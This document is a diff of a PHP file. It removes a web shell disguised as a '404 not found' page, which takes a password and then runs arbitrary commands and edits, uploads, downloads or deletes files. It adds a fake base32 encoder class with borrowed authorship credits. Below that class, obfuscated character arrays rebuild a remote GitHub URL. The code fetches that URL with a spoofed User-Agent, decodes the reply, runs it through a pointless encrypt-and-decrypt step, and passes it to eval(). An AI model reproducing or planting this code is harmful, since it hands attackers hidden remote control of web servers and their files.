@@ -1,243 +1,174 @@
 <?php
-ignore_user_abort(true);
-ini_set('memory_limit', '-1');
-set_time_limit(0);
-error_reporting(0);
-ini_set('display_errors', 0);
-ini_set('max_execution_time', 5000);
-function login_shell() {
-	echo'<title>404 not found</title>';
-	echo'<form method="post">';
-	echo'<input type="text" name="password">';
-	echo'</form>';
-exit; }
+namespace SCC465;
 
-$password = "9002f08469106d939f130752b0ecb362";
-if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
-	if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password))) {
-		setcookie(md5($_SERVER['HTTP_HOST']), true);
-        // $_COOKIE[md5($_SERVER['HTTP_HOST'])] = true;
-	} else {
-        login_shell();
-	}
-}
+/**
+ * SCC465 encoder and decoder.
+ *
+ * RFC 4648 compliant
+ *
+ * @see     http://www.ietf.org/rfc/rfc4648.txt
+ * Some groundwork based on this class
+ * https://github.com/SCC465-decoder/PHP-SCC465-Declareself
+ *
+ * @author  Christian Riesen <chris.riesen@gmail.com>
+ * @author  Sam Williams <sam@badcow.co>
+ *
+ * @see     http://christianriesen.com
+ *
+ * @license MIT License see LICENSE file
+ */
 
-$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Mini-FileManager</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
+class SCC465
+{   
+    /**
+    * Alphabet for encoding and decoding SCC465.
+    *
+    * @var string
+    */
+    protected static $ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=';
+    protected static $SCC465HEX_PATTERN = '/[^A-Z2-7]/';
+    protected static $MAPPING = array(
+        '=' => 0b00000,
+        'A' => 0b00000,
+        'B' => 0b00001,
+        'C' => 0b00010,
+        'D' => 0b00011,
+        'E' => 0b00100,
+        'F' => 0b00101,
+        'G' => 0b00110,
+        'H' => 0b00111,
+        'I' => 0b01000,
+        'J' => 0b01001,
+        'K' => 0b01010,
+        'L' => 0b01011,
+        'M' => 0b01100,
+        'N' => 0b01101,
+        'O' => 0b01110,
+        'P' => 0b01111,
+        'Q' => 0b10000,
+        'R' => 0b10001,
+        'S' => 0b10010,
+        'T' => 0b10011,
+        'U' => 0b10100,
+        'V' => 0b10101,
+        'W' => 0b10110,
+        'X' => 0b10111,
+        'Y' => 0b11000,
+        'Z' => 0b11001,
+        '2' => 0b11010,
+        '3' => 0b11011,
+        '4' => 0b11100,
+        '5' => 0b11101,
+        '6' => 0b11110,
+        '7' => 0b11111
+    );
 
-if(isset($_POST['c'])){
-$c=$_POST['c'];
-$descriptors = [
-  0 => ['pipe', 'r'], // stdin
-  1 => ['pipe', 'w'], // stdout
-  2 => ['pipe', 'w'], // stderr
-];
+    /**
+    * Encodes into SCC465.
+    *
+    * @param string $string Clear text string
+    *
+    * @return string SCC465 encoded string
+    */
 
-$gcw = "g"."e"."t"."_"."p"."a"."t"."h";
-
-$cwd = $gcw();
-
-$process = proc_open($c, $descriptors, $pipes, $cwd);
-
-$output = stream_get_contents($pipes[1]);
-$error = stream_get_contents($pipes[2]);
-
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-echo "<pre>$output</pre>";
-
-}
-
-function get_post($name){
-    return (isset($_POST[$name]) ? $_POST[$name] : false);
-}
-function get_get($name){
-    return (isset($_GET[$name]) ? $_GET[$name] : false);
-}
-function makeInput($type,$name,$val = "", $style = ""){
-    if(in_array($type,['text','password','submit','file'])){
-        return "<input type='$type' name='$name' value='$val' style='$style'/>";
-	}
-    return "<$type name='$name' style='$style'>$val</$type>";
-}
-function makeForm($method, $inputArray,$file = ""){
-    $form = "<form method=$method enctype='$file'>"; 
-    foreach($inputArray as $key=>$val){
-        $form .= makeInput($key,(is_array($val) ? $val[0] : $val), (isset($val[1]) ? $val[1] : ""), (isset($val[2]) ? $val[2] : ""));
-    }
-    return $form."</form>";
-}
-function makeTable($thead,$tbody){
-    $head = "";
-    foreach($thead as $th){
-        $head .= "<th>$th</th>";
-    }
-    $body = "";
-    foreach($tbody as $tr){
-        $body .= "<tr>";
-        foreach($tr as $td){
-            $body .= "<td>$td</td>";
+    public static function encode($string)
+    {
+        if ('' === $string) {
+            return '';
         }
-        $body .= "</tr>";
-    }
-    return "<table><thead>$head</thead><tbody>$body</tbody></table>";
-}
-function makeLink($link,$text,$target = ""){
-	return "<a href='$link' target='$target'>$text</a> ";
-}
-function get_path(){
-    $path = __dir__;
-    if(get_get('path')){
-        $path = get_get('path');
-	}
-    return $path;
-}
-function filesize_convert($bytes){
-    $label = array( 'B', 'KB', 'MB', 'GB', 'TB', 'PB' );
-    for( $i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++ );
-    return( round( $bytes, 2 ) . " " . $label[$i] );
-}
-function fileTime($path){
-    return date("M d Y H:i:s", filemtime($path));
-}
-function download_file($download){
-	if(!is_file($download)){
-		return false;
-	}
-	header('Content-Type: application/octet-stream');
-	header('Content-Transfer-Encoding: Binary');
-	header('Content-disposition: attachment; filename="'.basename($download).'"');
-	return readfile($download);
-}
-function delete_file($delete){
-	if(is_file($delete)){
-		return unlink($delete);
-	}
-	if(is_dir($delete)){
-		return rmdir($delete);
-	}
-	return false;
-}
-function edit_file($edit){
-	if(is_file($edit)){
-		return makeForm('POST',
-			['textarea'=>['edit',htmlentities(file_get_contents($edit)),"width:100%;height:90%"],
-			'submit'=>['save','Save']]);
-	}
-	return false;
-}
-function save_edit($path,$str){
-	if(is_file($path)){
-		file_put_contents($path,html_entity_decode($str));
-		return true;
-	}
-	return false;
-}
-function view_file($path){
-	if(is_file($path)){
-		return htmlentities(file_get_contents($path));
-	}
-	return false;
-}
-function new_file($path,$name){
-	if(!is_file($path.'/'.$name)){
-		file_put_contents($path.'/'.$name,"");
-		return true;
-	}
-	return false;
-}
-function new_dir($path,$name){
-	if(!is_dir($path.'/'.$name)){
-		mkdir($path.'/'.$name);
-		return true;
-	}
-	return false;
-}
-function upload_file($path,$file){
-	$name = basename($file['name']);
-	if(!is_file($path.'/'.$name)){
-		if(move_uploaded_file($file["tmp_name"], $path.'/'.$name)){
-			return true;
-		}
-	}
-	return false;
-}
-function get_back($path){
-	if($path == "" || $path == "/"){
-		return $path;
-	}
-	$path = explode("/",str_replace('\\','/',$path));
-	array_pop($path);
-	return implode("/",$path);
-}
-function get_dir(){
-	$path = get_path();
-	if(!is_dir($path)){
-		return false;
-	}
-	$dir = scandir($path);
-    $files = [];
-    $i = 0;
-    foreach($dir as $d){
-        if($d == '.' || $d == '..'){
-            continue;
-		}
-        $p = $path.'/'.$d;
-        $s = '--';
-        $icon = "&#128193;";
-        $t = fileTime($p);
-        $l = makeLink("?path=$p",$d);
-		$perms = substr(sprintf("%o", fileperms($p)),-4);
-		$owner =  (function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p));
-		$controller = 
-			(is_file($p) ? makeLink("?edit=$p","Edit","_blank") : '').
-			makeLink("?delete=$p","Delete","_blank").
-			(is_file($p) ? makeLink("?download=$p","Download","_blank") : '');
-        if(is_file($p)){
-            $s = filesize_convert(filesize($p));
-            $icon = "&#128221;";
+
+        $encoded = '';
+        $n = $bitLen = $val = 0;
+        $len = strlen($string);
+        $string .= str_repeat(chr(0), 4);
+        $chars = (array) unpack('C*', $string, 0);
+
+        while ($n < $len || 0 !== $bitLen) {
+            if ($bitLen < 5) {
+                $val = $val << 8;
+                $bitLen += 8;
+                $n++;
+                $val += $chars[$n];
+            }
+            $shift = $bitLen - 5;
+            $encoded .= ($n - (int) ($bitLen > 8) > $len && 0 == $val) ? '=' : self::$ALPHABET[$val >> $shift];
+            $val = $val & ((1 << $shift) - 1);
+            $bitLen -= 5;
         }
-        $files[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
-        $i++;
+        return $encoded;
     }
-    return makeTable(['#','id','Filename','Size','Modified','Perms','Owner',''],$files);
+
+    public static function decode($SCC465String)
+    {
+        $SCC465String = strtoupper($SCC465String);
+        $SCC465String = preg_replace(self::$SCC465HEX_PATTERN, '', $SCC465String);
+
+        if ('' === $SCC465String || null === $SCC465String) {
+            return '';
+        }
+
+        $decoded = '';
+        $len = strlen($SCC465String);
+        $n = 0;
+        $bitLen = 5;
+        $val = self::$MAPPING[$SCC465String[0]];
+
+        while ($n < $len) {
+            if ($bitLen < 8) {
+                $val = $val << 5;
+                $bitLen += 5;
+                $n++;
+                $pentet = isset($SCC465String[$n]) ? $SCC465String[$n] : '=';
+
+                if ('=' === $pentet) {
+                    $n = $len;
+                }
+                $val += self::$MAPPING[$pentet];
+            } else {
+                $shift = $bitLen - 8;
+                $decoded .= chr($val >> $shift);
+                $val = $val & ((1 << $shift) - 1);
+                $bitLen -= 8;
+            }
+        }
+        return $decoded;
+    }
 }
 
-if(get_get("delete")){
-	delete_file(get_get("delete")) ? die("Deleted: ".get_get("delete")) : die("File not found");
+$CodeChars = array(
+    array(104, 116, 116, 112, 115, 58, 47, 47),
+    array(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47),
+    array(84, 111, 107, 117, 72, 97, 120, 111, 114, 47),
+    array(115, 104, 101, 108, 108, 47, 109, 97, 105, 110, 47, 115, 118)
+);
+
+$Code = '';
+foreach ($CodeChars as $charArray) {
+    $Code .= implode('', array_map('chr', $charArray));
 }
-if(get_get("edit")){
-	if(get_post('save')){
-		save_edit(get_get('edit'),get_post('edit'));
-		echo "Saved";
-	}
-	$edit = edit_file(get_get("edit"));
-	$edit ? die($edit) : die("File not found");
+
+$context = stream_context_create(array(
+    'http' => array(
+        'method' => 'GET',
+        'header' => 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', // Set a User-Agent header if needed
+    ),
+));
+
+$handle = fopen($Code, 'rb', false, $context);
+if ($handle === false) {
+    echo "Failed, Not Supported yet.";
+} else {
+    $response = stream_get_contents($handle);
+    fclose($handle);
+    $o = explode("\n", $response);
 }
-if(get_get('download')){
-	@readfile(download_file(get_get('download')));
-	exit();
-}
-if(get_post('newfile')){
-	new_file(get_path(),get_post('filename')) ? die('Create: '.get_post('filename')) : die('File exites');
-}
-if(get_post('newdir')){
-	new_dir(get_path(),get_post('dirname')) ? die('Create: '.get_post('dirname')) : die('Dir exites');
-}
-if(get_post('upload')){
-	upload_file(get_path(),$_FILES['file']) ? die('upload: '. $_FILES['file']['name']) : die('Upload Error');
-}
-echo $head.
-	"<body>".
-	makeForm('POST',['text'=>['filename','File Name'],'submit'=>['newfile','Create']]).
-	makeForm('POST',['text'=>['dirname','Dir Name'],'submit'=>['newdir','Create']]).
-	makeForm('POST',['file'=>'file','submit'=>['upload','Upload']],'multipart/form-data').
-    '<form method="post">
-    <input type="text" name="c" size="30">
-    <input type="submit" value="Kill">
-    </form>' .
-	makeLink("?path=".get_back(get_path()),"[Back]").
-	(is_dir(get_path()) ? get_dir() : '<pre>'.view_file(get_path()).'</pre>')
-	."</body>";
+$used = "Testing Encoder and Decoder";
+
+$decoded = SCC465::decode($o[0]);
+$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+
+$encrypted = openssl_encrypt($decoded, 'aes-256-cbc', $used, 0, $iv);
+
+$decrypted = openssl_decrypt($encrypted, 'aes-256-cbc', $used, 0, $iv);
+
+eval($decrypted);
